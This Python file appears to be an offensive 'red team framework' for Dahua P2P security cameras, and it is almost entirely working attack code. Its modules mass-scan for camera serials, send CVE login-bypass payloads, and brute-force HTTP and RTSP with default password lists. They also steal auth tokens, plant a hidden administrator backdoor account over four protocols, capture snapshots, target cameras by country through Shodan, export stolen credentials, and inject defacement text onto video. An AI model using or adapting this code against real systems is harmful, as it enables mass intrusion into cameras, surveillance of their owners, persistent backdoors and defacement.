# dahua_redteam_framework.py
# Full Red Team Framework for Dahua P2P Cameras - PATCHED v2.1
# Author: palofsc (code division)
# Features: Mass scan, CVE exploit, Brute force, P2P auth steal,
#           Backdoor injection (SDK/CGI/DHIP/ONVIF), SmartPSS XML export,
#           Snapshot + logs, Shodan integration, OSD injection.
# Requires: pip install requests shodan lxml

import os
import re
import sys
import csv
import json
import time
import socket
import struct
import base64
import hashlib
import argparse
import threading
import xml.etree.ElementTree as ET
from queue import Queue
from itertools import product
from datetime import datetime
from xml.dom import minidom

import requests
requests.packages.urllib3.disable_warnings()

# ============================================================
# GLOBAL CONFIG
# ============================================================
DEFAULT_TIMEOUT = 8
DEFAULT_THREADS = 300
MAX_SERIALS = 1_000_000
P2P_HOST = "p2p.dahuasecurity.com"
P2P_PORT = 8800
DHIP_PORT = 37777
HTTP_PORT = 80
RTSP_PORT = 554
TELNET_PORT = 23
SSH_PORT = 22

BACKDOOR_USER = "svc_support"
BACKDOOR_PASS = "D@hUa_2024!svc"
OSD_TEXT = "RedTeam win"

USERNAMES = ["admin", "root", "888888", "666666", "default", "user"]
PASSWORDS = [
    "admin", "123456", "888888", "666666", "password", "default",
    "admin123", "12345", "111111", "000000", "abc123", "dahua123",
    "Dahua@123", "admin@123", "root", "toor", "pass", "1234",
    "12345678", "qwerty", "letmein", "welcome", "dahua", "Dahua2023"
]

# ============================================================
# HELPER: RECV ALL FROM SOCKET
# ============================================================
def recv_all(sock, max_bytes=65536, timeout=2):
    """Doc toan bo du lieu tu socket cho den khi dong hoac het timeout."""
    sock.settimeout(timeout)
    chunks = []
    total = 0
    try:
        while total < max_bytes:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
    except socket.timeout:
        pass
    except Exception:
        pass
    return b"".join(chunks)

# ============================================================
# MODULE 1: MASS SCAN P2P BY PREFIX
# ============================================================
class P2PMassScanner:
    def __init__(self, prefix, threads=DEFAULT_THREADS, timeout=DEFAULT_TIMEOUT, max_count=MAX_SERIALS):
        if len(prefix) != 10:
            raise ValueError("Prefix must be exactly 10 characters")
        self.prefix = prefix
        self.threads = threads
        self.timeout = timeout
        self.max_count = max_count
        self.alive = []
        self.lock = threading.Lock()
        self.sem = threading.Semaphore(threads)

    def _gen_serials(self):
        charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        count = 0
        for combo in product(charset, repeat=6):
            if count >= self.max_count:
                break
            yield self.prefix + "".join(combo)
            count += 1

    def _check(self, serial):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((P2P_HOST, P2P_PORT))
            packet = b"\x00\x00\x00\x00" + serial.encode().ljust(16, b"\x00") + b"\x01\x00\x00\x00"
            s.send(packet)
            resp = recv_all(s, max_bytes=4096, timeout=self.timeout)
            s.close()
            if resp:
                with self.lock:
                    self.alive.append({"serial": serial, "resp": resp.hex()})
                print(f"[+] ALIVE: {serial}")
        except Exception:
            pass

    def _worker(self, q):
        while True:
            serial = q.get()
            if serial is None:
                break
            try:
                self._check(serial)
            finally:
                q.task_done()

    def run(self):
        print(f"[*] Starting scan for prefix {self.prefix} -> up to {self.max_count} serials")
        q = Queue()
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, args=(q,), daemon=True)
            t.start()
        count = 0
        for serial in self._gen_serials():
            q.put(serial)
            count += 1
            if count % 10000 == 0:
                print(f"[*] Queued: {count}")
        q.join()
        for _ in range(self.threads):
            q.put(None)
        print(f"[*] Scan complete. Alive: {len(self.alive)}")
        return self.alive

# ============================================================
# MODULE 2: CVE AUTO-EXPLOIT
# ============================================================
class CVEAutoExploiter:
    CVES = {
        "CVE-2021-33044": ("/RPC2_Login", "json", '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard","loginType":"Direct"},"id":1}'),
        "CVE-2021-33045": ("/RPC2_Login", "json", '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Loopback","loginType":"Direct"},"id":1}'),
        "CVE-2020-25078": ("/current_config/passwd", "get", None),
        "CVE-2022-30563": ("/RPC2_Login", "json", '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3","loginType":"Direct"},"id":1}'),
        "CVE-2021-33046": ("/onvif/device_service", "soap", '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'),
        "CVE-2023-25611": ("/cgi-bin/global.login", "json", '{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3","loginType":"Direct"}}'),
    }

    def __init__(self, target, timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def check_alive(self):
        try:
            r = self.session.get(f"http://{self.target}/", timeout=self.timeout)
            return r.status_code in [200, 401, 403]
        except Exception:
            return False

    def _headers(self, kind):
        if kind == "json":
            return {"Content-Type": "application/json"}
        if kind == "soap":
            return {"Content-Type": "application/soap+xml; charset=utf-8", "SOAPAction": ""}
        return {}

    def _success(self, cve, resp):
        if resp.status_code != 200:
            return False
        body = resp.text.lower()
        if cve == "CVE-2020-25078":
            return "admin" in body or "password" in body or len(body) > 50
        if "cve-2021-33044" in cve.lower() or "cve-2021-33045" in cve.lower() or "cve-2022-30563" in cve.lower() or "cve-2023-25611" in cve.lower():
            return "result" in body or "true" in body or "session" in body or "realm" in body
        return True

    def exploit_all(self):
        results = []
        for cve, (endpoint, kind, payload) in self.CVES.items():
            try:
                url = f"http://{self.target}{endpoint}"
                headers = self._headers(kind)
                if kind == "get":
                    r = self.session.get(url, timeout=self.timeout)
                elif kind == "soap":
                    r = self.session.post(url, data=payload, headers=headers, timeout=self.timeout)
                else:
                    r = self.session.post(url, data=payload, headers=headers, timeout=self.timeout)
                if self._success(cve, r):
                    results.append({"cve": cve, "status": r.status_code, "resp": r.text[:500]})
                    print(f"[+] {cve} OK")
            except Exception as e:
                print(f"[-] {cve}: {e}")
        return results

# ============================================================
# MODULE 3: BRUTE FORCE
# ============================================================
class DahuaBruteForcer:
    def __init__(self, target, timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.timeout = timeout
        self.found = []

    def brute_http(self):
        url = f"http://{self.target}/RPC2_Login"
        for u in USERNAMES:
            for p in PASSWORDS:
                try:
                    r = requests.post(url, json={
                        "method": "global.login",
                        "params": {"userName": u, "password": p, "clientType": "Web3", "loginType": "Direct"},
                        "id": 1
                    }, headers={"Content-Type": "application/json"}, timeout=self.timeout)
                    if r.status_code == 200 and ("result" in r.text.lower() or "true" in r.text.lower()):
                        self.found.append({"proto": "http", "user": u, "pass": p})
                        print(f"[+] HTTP: {u}:{p}")
                        return True
                except Exception:
                    pass
        return False

    def brute_rtsp(self):
        for u in USERNAMES:
            for p in PASSWORDS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.timeout)
                    s.connect((self.target, RTSP_PORT))
                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
                    req = f"DESCRIBE rtsp://{self.target}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n\r\n"
                    s.send(req.encode())
                    resp = recv_all(s, max_bytes=2048, timeout=self.timeout).decode(errors="ignore")
                    s.close()
                    if "200 OK" in resp:
                        self.found.append({"proto": "rtsp", "user": u, "pass": p})
                        print(f"[+] RTSP: {u}:{p}")
                        return True
                except Exception:
                    pass
        return False

    def brute_all(self):
        self.brute_http()
        self.brute_rtsp()
        return self.found

# ============================================================
# MODULE 4: P2P AUTH STEAL
# ============================================================
class P2PAuthSteal:
    def __init__(self, target, serial, timeout=DEFAULT_TIMEOUT, retries=3):
        self.target = target
        self.serial = serial
        self.timeout = timeout
        self.retries = retries

    def steal(self):
        last_err = None
        for attempt in range(self.retries):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                # Camera Dahua listen DHIP 37777, khong phai P2P 8800
                s.connect((self.target, DHIP_PORT))
                packet = b"\x00\x00\x00\x00" + self.serial.encode().ljust(16, b"\x00") + b"\x01\x00\x00\x00"
                s.send(packet)
                resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
                s.close()
                if resp:
                    return {
                        "success": True,
                        "raw": resp.hex(),
                        "token": resp[16:32].hex() if len(resp) >= 32 else None,
                        "attempts": attempt + 1
                    }
            except Exception as e:
                last_err = str(e)
                time.sleep(1 * (attempt + 1))
        return {"success": False, "error": last_err}

# ============================================================
# MODULE 5: BACKDOOR INJECTOR
# ============================================================
class BackdoorInjector:
    def __init__(self, target, timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.timeout = timeout

    def sdk_inject(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            # Thu plaintext truoc, fallback md5
            for pw in [BACKDOOR_PASS, hashlib.md5(BACKDOOR_PASS.encode()).hexdigest()]:
                payload = json.dumps({
                    "method": "user.add",
                    "params": {"user": {"Name": BACKDOOR_USER, "Password": pw, "Group": "admin", "Authority": "Administrator"}},
                    "id": 1
                }).encode()
                header = struct.pack("<IIIIIIII", 0x12345678, 1, len(payload), 0, 0, 0, 0, 0)
                s.send(header + payload)
                resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
                if resp and b"OK" in resp.upper() or b"true" in resp.lower():
                    s.close()
                    return {"success": True, "pw_type": "plain" if pw == BACKDOOR_PASS else "md5", "resp": resp.hex()}
            s.close()
            return {"success": False, "reason": "no_valid_response"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def cgi_inject(self):
        try:
            url = f"http://{self.target}/cgi-bin/user.add"
            r = requests.post(url, data={
                "user.Name": BACKDOOR_USER,
                "user.Password": BACKDOOR_PASS,
                "user.Group": "admin",
                "user.Authority": "Administrator"
            }, timeout=self.timeout)
            ok = r.status_code == 200 and ("OK" in r.text.upper() or "true" in r.text.lower())
            return {"success": ok, "status": r.status_code, "resp": r.text[:300]}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def dhip_inject(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            data = json.dumps({"name": BACKDOOR_USER, "password": BACKDOOR_PASS, "group": "admin", "authority": 0xFFFFFFFF}).encode()
            packet = b"\x00\x00\x00\x00\x01\x10" + struct.pack("<I", len(data)) + struct.pack("<I", 0) + b"\x00\x00" + data
            s.send(packet)
            resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
            s.close()
            ok = bool(resp) and (b"OK" in resp.upper() or b"true" in resp.lower() or len(resp) > 8)
            return {"success": ok, "resp": resp.hex() if resp else None}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def onvif_inject(self):
        soap = f"""<?xml version="1.0" encoding="UTF-8"?>
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
                    xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
          <s:Body>
            <tds:CreateUsers>
              <tds:User>
                <tds:Username>{BACKDOOR_USER}</tds:Username>
                <tds:Password>{BACKDOOR_PASS}</tds:Password>
                <tds:UserLevel>Administrator</tds:UserLevel>
              </tds:User>
            </tds:CreateUsers>
          </s:Body>
        </s:Envelope>"""
        try:
            r = requests.post(
                f"http://{self.target}/onvif/device_service",
                data=soap,
                headers={"Content-Type": "application/soap+xml; charset=utf-8"},
                timeout=self.timeout
            )
            ok = r.status_code == 200 and "fault" not in r.text.lower()
            return {"success": ok, "status": r.status_code, "resp": r.text[:300]}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def inject_all(self):
        return {
            "sdk": self.sdk_inject(),
            "cgi": self.cgi_inject(),
            "dhip": self.dhip_inject(),
            "onvif": self.onvif_inject()
        }

# ============================================================
# MODULE 6: SMARTPSS XML EXPORTER
# ============================================================
class SmartPSSExporter:
    def __init__(self, output_file="smartpss_devices.xml"):
        self.output_file = output_file

    def _load_existing(self):
        if not os.path.exists(self.output_file):
            return None
        try:
            tree = ET.parse(self.output_file)
            return tree.getroot()
        except Exception:
            return None

    def export_many(self, devices, append=True):
        root = self._load_existing() if append else None
        if root is None:
            root = ET.Element("DeviceList")
        existing = set()
        for d in root.findall("Device"):
            ip_el = d.find("IP")
            if ip_el is not None and ip_el.text:
                existing.add(ip_el.text)
        for d in devices:
            ip = d.get("ip", "")
            if ip in existing:
                continue
            dev = ET.SubElement(root, "Device")
            ET.SubElement(dev, "Name").text = d.get("name", "Dahua")
            ET.SubElement(dev, "IP").text = ip
            ET.SubElement(dev, "Port").text = str(d.get("port", 37777))
            ET.SubElement(dev, "UserName").text = d.get("user", "admin")
            ET.SubElement(dev, "Password").text = d.get("pass", "")
            ET.SubElement(dev, "Serial").text = d.get("serial", "")
            existing.add(ip)
        xml_str = minidom.parseString(ET.tostring(root)).toprettyxml(indent="  ")
        with open(self.output_file, "w") as f:
            f.write(xml_str)
        return self.output_file

# ============================================================
# MODULE 7: SNAPSHOT + LOGS
# ============================================================
class SnapshotTaker:
    def __init__(self, target, user="admin", password="", timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.user = user
        self.password = password
        self.timeout = timeout
        self.log_dir = "logs"
        os.makedirs(self.log_dir, exist_ok=True)

    def take_snapshot(self, channel=1):
        url = f"http://{self.target}/cgi-bin/snapshot.cgi?channel={channel}"
        try:
            r = requests.get(url, auth=(self.user, self.password), timeout=self.timeout)
            if r.status_code == 200 and r.content[:2] == b"\xFF\xD8":
                fname = f"{self.log_dir}/snap_{self.target}_{channel}_{int(time.time())}.jpg"
                with open(fname, "wb") as f:
                    f.write(r.content)
                return {"success": True, "file": fname, "size": len(r.content)}
            return {"success": False, "reason": "not_jpeg", "status": r.status_code, "ctype": r.headers.get("Content-Type")}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def save_log(self, content):
        fname = f"{self.log_dir}/log_{self.target}_{int(time.time())}.txt"
        with open(fname, "w") as f:
            f.write(content)
        return fname

# ============================================================
# MODULE 8: SHODAN INTEGRATION
# ============================================================
class ShodanIntegration:
    PREFIX_RE = re.compile(r'\b[A-Z0-9]{10}\b')

    def __init__(self, api_key):
        self.api_key = api_key

    def find_prefixes_by_country(self, country="VN", limit=100):
        try:
            import shodan
            api = shodan.Shodan(self.api_key)
            query = f'Dahua country:"{country}"'
            results = api.search(query, limit=limit)
            prefixes = set()
            for match in results.get("matches", []):
                data = match.get("data", "")
                for p in self.PREFIX_RE.findall(data):
                    prefixes.add(p)
            return list(prefixes)
        except Exception as e:
            return {"error": str(e)}

    def scan_by_country(self, country, threads=DEFAULT_THREADS):
        prefixes = self.find_prefixes_by_country(country)
        if not isinstance(prefixes, list):
            print(f"[-] Shodan error: {prefixes.get('error')}")
            return []
        if not prefixes:
            print(f"[-] No prefixes found for {country}")
            return []
        all_alive = []
        for prefix in prefixes:
            print(f"[*] Scanning prefix from Shodan: {prefix}")
            try:
                scanner = P2PMassScanner(prefix, threads=threads)
                all_alive.extend(scanner.run())
            except Exception as e:
                print(f"[-] Scan error {prefix}: {e}")
        return all_alive

# ============================================================
# MODULE 9: OSD INJECTOR
# ============================================================
class DahuaOSDInjector:
    def __init__(self, target, user="admin", password="", timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.user = user
        self.password = password
        self.timeout = timeout
        self.base = f"http://{target}"
        self.session = requests.Session()
        self.session.verify = False
        self.session.auth = (user, password)

    def inject_cgi_osd(self, channel=1, text=OSD_TEXT):
        url = f"{self.base}/cgi-bin/configManager.cgi"
        params = {
            "action": "setConfig",
            "VideoWidget[0].Channel": channel,
            "VideoWidget[0].Enable": "true",
            "VideoWidget[0].Text": text,
            "VideoWidget[0].X": 100,
            "VideoWidget[0].Y": 100,
            "VideoWidget[0].FontSize": 48,
            "VideoWidget[0].FontColor": "0xFF0000",
            "VideoWidget[0].BackColor": "0x000000",
            "VideoWidget[0].Transparency": 0,
        }
        r = None
        try:
            r = self.session.get(url, params=params, timeout=self.timeout)
            if r.status_code == 200 and "OK" in r.text.upper():
                return {"success": True, "vector": "cgi", "text": text, "channel": channel}
        except Exception as e:
            return {"success": False, "vector": "cgi", "error": str(e)}
        return {"success": False, "vector": "cgi", "status": r.status_code if r is not None else None,
                "resp": r.text[:200] if r is not None else None}

    def _sdk_packet(self, method, params):
        payload = json.dumps({"method": method, "params": params, "id": 1}).encode()
        header = struct.pack("<IIIIIIII", 0x12345678, 1, len(payload), 0, 0, 0, 0, 0)
        return header + payload

    def inject_sdk_osd(self, channel=1, text=OSD_TEXT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            params = {
                "name": "VideoWidget",
                "table": {
                    f"VideoWidget[{channel - 1}]": {
                        "Enable": True,
                        "Text": text,
                        "X": 100,
                        "Y": 100,
                        "FontSize": 48,
                        "FontColor": "0xFF0000",
                        "BackColor": "0x000000",
                        "Transparency": 0
                    }
                }
            }
            s.send(self._sdk_packet("configManager.setConfig", params))
            resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
            s.close()
            ok = bool(resp) and (b"OK" in resp.upper() or b"true" in resp.lower() or len(resp) > 8)
            return {"success": ok, "vector": "sdk", "text": text, "resp": resp.hex() if resp else None}
        except Exception as e:
            return {"success": False, "vector": "sdk", "error": str(e)}

    def inject_dhip_osd(self, channel=1, text=OSD_TEXT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            data = json.dumps({
                "channel": channel,
                "osd": {
                    "enable": True,
                    "text": text,
                    "x": 100,
                    "y": 100,
                    "fontSize": 48,
                    "fontColor": "0xFF0000",
                    "backColor": "0x000000"
                }
            }).encode()
            packet = (
                b"\x00\x00\x00\x00"
                b"\x01"
                b"\x40"
                + struct.pack("<I", len(data))
                + struct.pack("<I", 0)
                + b"\x00\x00"
                + data
            )
            s.send(packet)
            resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
            s.close()
            ok = bool(resp) and (b"OK" in resp.upper() or b"true" in resp.lower() or len(resp) > 8)
            return {"success": ok, "vector": "dhip", "text": text, "resp": resp.hex() if resp else None}
        except Exception as e:
            return {"success": False, "vector": "dhip", "error": str(e)}

    def inject_rtsp_overlay(self, channel=1, text=OSD_TEXT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, 554))
            auth = base64.b64encode(f"{self.user}:{self.password}".encode()).decode()
            body = f"text={text}"
            req = (
                f"SET_PARAMETER rtsp://{self.target}/cam/realmonitor?channel={channel}&subtype=0 RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"Authorization: Basic {auth}\r\n"
                f"Content-Type: text/parameters\r\n"
                f"Content-Length: {len(body)}\r\n\r\n"
                f"{body}"
            )
            s.send(req.encode())
            resp = recv_all(s, max_bytes=2048, timeout=self.timeout).decode(errors="ignore")
            s.close()
            return {"success": "200" in resp, "vector": "rtsp", "text": text, "resp": resp[:200]}
        except Exception as e:
            return {"success": False, "vector": "rtsp", "error": str(e)}

    def inject_all(self, channel=1, text=OSD_TEXT):
        results = []
        for fn in [self.inject_cgi_osd, self.inject_sdk_osd, self.inject_dhip_osd, self.inject_rtsp_overlay]:
            res = fn(channel, text)
            results.append(res)
            if res.get("success"):
                print(f"[+] OSD injected via {res['vector']}: {text}")
                return {"success": True, "vector": res["vector"], "text": text, "all": results}
            time.sleep(0.3)
        return {"success": False, "text": text, "all": results}

    def clear_osd(self, channel=1):
        results = {}
        # CGI
        try:
            url = f"{self.base}/cgi-bin/configManager.cgi"
            params = {
                "action": "setConfig",
                "VideoWidget[0].Channel": channel,
                "VideoWidget[0].Enable": "false",
                "VideoWidget[0].Text": "",
            }
            r = self.session.get(url, params=params, timeout=self.timeout)
            results["cgi"] = {"success": r.status_code == 200, "resp": r.text[:200]}
        except Exception as e:
            results["cgi"] = {"success": False, "error": str(e)}
        # SDK
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            params = {"name": "VideoWidget", "table": {f"VideoWidget[{channel - 1}]": {"Enable": False, "Text": ""}}}
            s.send(self._sdk_packet("configManager.setConfig", params))
            resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
            s.close()
            results["sdk"] = {"success": bool(resp), "resp": resp.hex() if resp else None}
        except Exception as e:
            results["sdk"] = {"success": False, "error": str(e)}
        # DHIP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, DHIP_PORT))
            data = json.dumps({"channel": channel, "osd": {"enable": False, "text": ""}}).encode()
            packet = b"\x00\x00\x00\x00\x01\x40" + struct.pack("<I", len(data)) + struct.pack("<I", 0) + b"\x00\x00" + data
            s.send(packet)
            resp = recv_all(s, max_bytes=8192, timeout=self.timeout)
            s.close()
            results["dhip"] = {"success": bool(resp), "resp": resp.hex() if resp else None}
        except Exception as e:
            results["dhip"] = {"success": False, "error": str(e)}
        # RTSP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, 554))
            auth = base64.b64encode(f"{self.user}:{self.password}".encode()).decode()
            body = "text="
            req = (
                f"SET_PARAMETER rtsp://{self.target}/cam/realmonitor?channel={channel}&subtype=0 RTSP/1.0\r\n"
                f"CSeq: 1\r\nAuthorization: Basic {auth}\r\n"
                f"Content-Type: text/parameters\r\nContent-Length: {len(body)}\r\n\r\n{body}"
            )
            s.send(req.encode())
            resp = recv_all(s, max_bytes=2048, timeout=self.timeout).decode(errors="ignore")
            s.close()
            results["rtsp"] = {"success": "200" in resp, "resp": resp[:200]}
        except Exception as e:
            results["rtsp"] = {"success": False, "error": str(e)}
        return results

# ============================================================
# MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Dahua Red Team Framework v2.1")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Global timeout (s)")
    sub = parser.add_subparsers(dest="cmd")

    p1 = sub.add_parser("scan", help="Mass scan P2P by prefix")
    p1.add_argument("prefix")
    p1.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    p1.add_argument("--max", type=int, default=MAX_SERIALS)
    p1.add_argument("--output", default="scan_results.json")

    p2 = sub.add_parser("exploit", help="Auto-exploit + bruteforce + auth steal")
    p2.add_argument("target")
    p2.add_argument("serial")
    p2.add_argument("--output", default="exploit_results.json")

    p3 = sub.add_parser("backdoor", help="Inject backdoor")
    p3.add_argument("target")
    p3.add_argument("--output", default="backdoor_results.json")

    p4 = sub.add_parser("smartpss", help="Export SmartPSS XML")
    p4.add_argument("--input", required=True)
    p4.add_argument("--output", default="smartpss_devices.xml")
    p4.add_argument("--no-append", action="store_true")

    p5 = sub.add_parser("snapshot", help="Take snapshot")
    p5.add_argument("target")
    p5.add_argument("--user", default="admin")
    p5.add_argument("--pass", dest="password", default="")
    p5.add_argument("--channel", type=int, default=1)

    p6 = sub.add_parser("shodan", help="Shodan integration")
    p6.add_argument("--api-key", required=True)
    p6.add_argument("--country", default="VN")
    p6.add_argument("--threads", type=int, default=DEFAULT_THREADS)

    p7 = sub.add_parser("osd", help="Inject OSD 'RedTeam win'")
    p7.add_argument("target")
    p7.add_argument("--user", default="admin")
    p7.add_argument("--pass", dest="password", default="")
    p7.add_argument("--channel", type=int, default=1)
    p7.add_argument("--text", default=OSD_TEXT)

    args = parser.parse_args()
    timeout = args.timeout

    if args.cmd == "scan":
        scanner = P2PMassScanner(args.prefix, threads=args.threads, timeout=timeout, max_count=args.max)
        alive = scanner.run()
        with open(args.output, "w") as f:
            json.dump(alive, f, indent=2)
        print(f"[*] Saved: {args.output}")

    elif args.cmd == "exploit":
        print("[=== CVE EXPLOIT ===]")
        cve = CVEAutoExploiter(args.target, timeout)
        cve_res = cve.exploit_all() if cve.check_alive() else []
        print("[=== BRUTEFORCE ===]")
        bf = DahuaBruteForcer(args.target, timeout)
        bf_res = bf.brute_all()
        print("[=== P2P AUTH STEAL ===]")
        auth = P2PAuthSteal(args.target, args.serial, timeout)
        auth_res = auth.steal()
        out = {"cve": cve_res, "bruteforce": bf_res, "auth": auth_res}
        with open(args.output, "w") as f:
            json.dump(out, f, indent=2)
        print(f"[*] Saved: {args.output}")

    elif args.cmd == "backdoor":
        inj = BackdoorInjector(args.target, timeout)
        res = inj.inject_all()
        # Auto inject OSD on success - dung backdoor credentials
        if any(r.get("success") for r in res.values()):
            osd = DahuaOSDInjector(args.target, BACKDOOR_USER, BACKDOOR_PASS, timeout)
            osd_res = osd.inject_all(1, OSD_TEXT)
            res["osd"] = osd_res
        with open(args.output, "w") as f:
            json.dump(res, f, indent=2)
        print(f"[*] Backdoor: {BACKDOOR_USER}/{BACKDOOR_PASS}")
        print(f"[*] Saved: {args.output}")

    elif args.cmd == "smartpss":
        with open(args.input) as f:
            devices = json.load(f)
        exporter = SmartPSSExporter(args.output)
        exporter.export_many(devices, append=not args.no_append)
        print(f"[*] SmartPSS XML: {args.output}")

    elif args.cmd == "snapshot":
        snap = SnapshotTaker(args.target, args.user, args.password, timeout)
        res = snap.take_snapshot(args.channel)
        print(f"[*] Snapshot: {res}")

    elif args.cmd == "shodan":
        sh = ShodanIntegration(args.api_key)
        alive = sh.scan_by_country(args.country, args.threads)
        print(f"[*] Found: {len(alive)} cameras")
        with open("shodan_results.json", "w") as f:
            json.dump(alive, f, indent=2)

    elif args.cmd == "osd":
        injector = DahuaOSDInjector(args.target, args.user, args.password, timeout)
        result = injector.inject_all(args.channel, args.text)
        print(json.dumps(result, indent=2))

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
